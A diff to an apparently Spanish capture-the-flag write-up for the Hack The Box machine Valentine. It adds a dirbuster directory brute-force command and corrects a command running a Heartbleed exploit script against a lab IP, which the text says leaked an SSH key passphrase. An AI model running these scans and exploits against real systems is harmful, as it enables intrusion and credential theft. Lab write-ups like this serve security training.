@@ -56,8 +56,11 @@ ffuf -r -fc 404 -fs 3861 -t 1000  -w /usr/share/wordlists/seclists/Discovery/Web
 ## Dirbuster
 
 ```
-
+dirbuster -u http://valentine.htb/ -t 100 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r dirout.ext -e php,txt,html 
 ```
+
+
+
 
 ## HeartBleed
 
@@ -67,7 +70,7 @@ ffuf -r -fc 404 -fs 3861 -t 1000  -w /usr/share/wordlists/seclists/Discovery/Web
 Nos damos cuenta que es un servidor viejo vulnerable a heartbleed entonces pues probamos el exploit y nos trae una cadena en base64 que es el paass de la key id_rsa
 
 ```
-pythn2 32764.py 10.129.71.228 -p 443 | grep -v "00"
+python2 32764.py 10.129.71.228 -p 443 | grep -v "00"
 
 ```
 
